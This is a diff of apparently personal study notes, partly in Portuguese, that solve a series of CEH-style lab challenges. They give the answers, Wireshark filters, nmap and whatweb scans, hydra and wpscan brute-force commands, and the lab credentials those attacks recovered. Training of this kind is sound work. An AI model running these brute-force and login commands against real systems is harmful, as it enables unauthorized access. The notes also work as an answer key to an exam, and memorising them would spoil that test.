@@ -1,7 +1,17 @@
 # PART III - Challenge 1  💬ANSWER: 172.30.10.200💬
 #### C:\Users\Documents\$_Jack.pcapng 
 ### FILTER: tcp.flags.reset == 1
+### PATH: Statistics → Conversations → TCP
 ### INFO: Source → 172.30.10.200
+
+# ⚠️ COMANDOS IMPORTANTES
+### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.dst == 172.30.10.200  # envio de flag reset com payload vazio
+### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.src == 172.30.10.200 
+### FILTER: tcp.analysis.retransmission || tcp.analysis.out_of_order # Sequência de sessão quebrada
+
+
+#------------------------------#
+
 
 # PART III - Challenge 2 💬ANSWER: lee/test💬
 #### C:\Users\Downloads\Intercep_$niffer.pcapng 
@@ -11,29 +21,64 @@
 ####    Form item: "txtusername" == "lee"
 ####    Form item: "txtpwd" == "test"
 
-# ⚠️ PART III - Challenge 3  💬ANSWER: 172.30.10.99💬
+# ⚠️ COMANDOS IMPORTANTES
+### FILTER: http.request.method == POST && frame contains "txt"
+### FILTER: http contains "username" || http contains "password"
+### FILTER: tcp.port == 80 && http
+### FILTER: http.request && !(http.response)
+
+
+#------------------------------#
+
+
+# PART III - Challenge 3  💬ANSWER: 172.30.10.99💬
 #### ~/Donwloads/cowrie.log
 cat ~/Donwloads/cowrie.log
 ### INFO: 2024-09-11T01:28:11.805001Z [HoneyPotSSHTransport,1,172.30.10.99] Connection lost after 0 seconds
+### INFO: 2024-09-11T01:29:11.805001Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 172.30.10.99:35929 (102.168.10.111:2222) [session: 33295034a52] 
+### INFO: 2024-09-11T01:28:11.933069Z [HoneyPotSSHTransport,2,172.30.10.99] Remote SSH version: SSH-2.0-PuTTy_Realese_0.76
+### INFO: 2024-09-11T01:28:11.933069Z [HoneyPotSSHTransport,2,172.30.10.99] SSH client hassh fingerprint: 5b7713a9ef2d162b16ea018fa8d40f02
 
-# ⚠️ PART III - Challenge 4  💬ANSWER: Apache💬
-nmap -p 22 192.168.10.0/24 --open
-# whatweb certifiedhacker.com
+
+#------------------------------#
+
+
+# PART III - Challenge 4  💬ANSWER: Apache💬
 curl -I certifiedhacker.com
-### INFO: Server → Apache 
+# nmap -script http-headers certifiedhacker.com
+# nmap -sV -p 80,443 certifiedhacker.com
+### INFO: Apache
+
+# ⚠️ COMANDOS IMPORTANTES
+# whatweb -a 3 certifiedhacker.com
+# nc certifiedhacker.com 80
+# http -h certifiedhacker.com
+# openssl s_client -connect certifiedhacker.com:443
+
+
+#------------------------------#
+
 
 # PART III - Challenge 5  💬ANSWER: i2tr&^72546HJ*💬
-nmap -p 22 192.168.10.0/24 --open
-hydra -l Martin -P /home/attacker/Desktop/password.txt ftp://192.168.10.101
+hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
 ### INFO: [22] [ssh] host: 192.168.10.101 login: Martin password: qwerty1234
-ssh Martin@192.168.10.101
+# ssh Martin@192.168.10.101 
 ### PASSWORD: qwerty1234
+
 #### ~/Desktop/$ollers.txt
-dir # CONECTADO VIA SSH
-cd Desktop
+cd Desktop # CONECTADO VIA SSH
 dir
 type $ollers.txt
 ### INFO: Password to enter my crypto account: i2tr&^72546HJ*
+
+# ⚠️ COMANDOS IMPORTANTES
+# hydra -l Martin -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
+# hydra -l Martin -p qwerty1234 192.168.10.101 ssh 
+# sshpass -p 'qwerty1234' ssh Martin@192.168.10.101
+
+
+#------------------------------#
+
 
 # ⚠️ PART III - Challenge 6  💬ANSWER: 7867721010💬
 ftp 192.168.10.111
@@ -55,6 +100,10 @@ cat w_domain.com
 nmap -p 8080 172.30.10.99 -sV --open
 ### INFO: 8080/tcp  open  http  Apache Tomcat/Coyote JSP engine 1.1
 
+
+#------------------------------#
+
+
 # PART III - Challenge 8  💬ANSWER: EC-Council💬
 ssh Martin@192.168.10.101
 ### PASSWORD: qwerty1234
@@ -67,13 +116,21 @@ type webpent.txt
 whatweb www.moviescope.com
 ### INFO: ..., Meta-Author[EC-Council], ...
 
+
+#------------------------------#
+
+
 # ⚠️ PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬 && PART III - Challenge 10  💬ANSWER: Content Security Policy💬
 owasp-zap
 ### Automated Run → URL to attack: https://www.goodshopping.com → Attack
 ### Alerts → User Controllable HTML Element Attibute (Potential XSS)
 ### INFO: Description → ... for XSS (cros-site scripting) ... 
 ### Alerts → Content Security Policy (CSP) Header Not Set
-### INFO: Source → Passive (10038 - Content Security Policy (CSP) Header Not Set) 
+### INFO: Source → Passive (10038 - Content Security Policy (CSP) Header Not Set)
+
+
+#------------------------------#
+
 
 # ⚠️ PART III - Challenge 11 💬ANSWER: 36💬
 nmap -p 21,80,445,3389 -O 192.168.10/24
@@ -95,12 +152,20 @@ pdftotext Documents/w_report.pdf report.txt
 grep -i "sensitive files" report.txt
 ### INFO: 12.36 Directory Listing of Sensitive Files
 
+
+#------------------------------#
+
+
 # ⚠️ PART III - Challenge 12 💬ANSWER: orange1234💬
 curl -I http://www.cehorg.com:8080/CEH/wp-login.php
 wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u
 find / -name password.txt 2>/dev/null
 wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P ~/Desktop/password.txt
 ### INFO: Username: adam, Password: orange1234
+
+
+#------------------------------#
+
 
 # PART III - Challenge 13 💬ANSWER: 3💬
 #### C:\Users\Admin\Desktop\www.moviescope.com_09112024_0538.html
@@ -110,6 +175,10 @@ dir
 ### INFO: Content Security Policy Configuration     1
 ### INFO: Clickjacing Protection                    1
 ### INFO: MIME Type Confusion                       1
+
+
+#------------------------------#
+
 
 # PART III - Challenge 14 💬ANSWER: 5💬 && # PART III - Challenge 15 💬ANSWER: 19💬
 #### GOOGLE: http://www.moviescope.com/ # Realizar login 
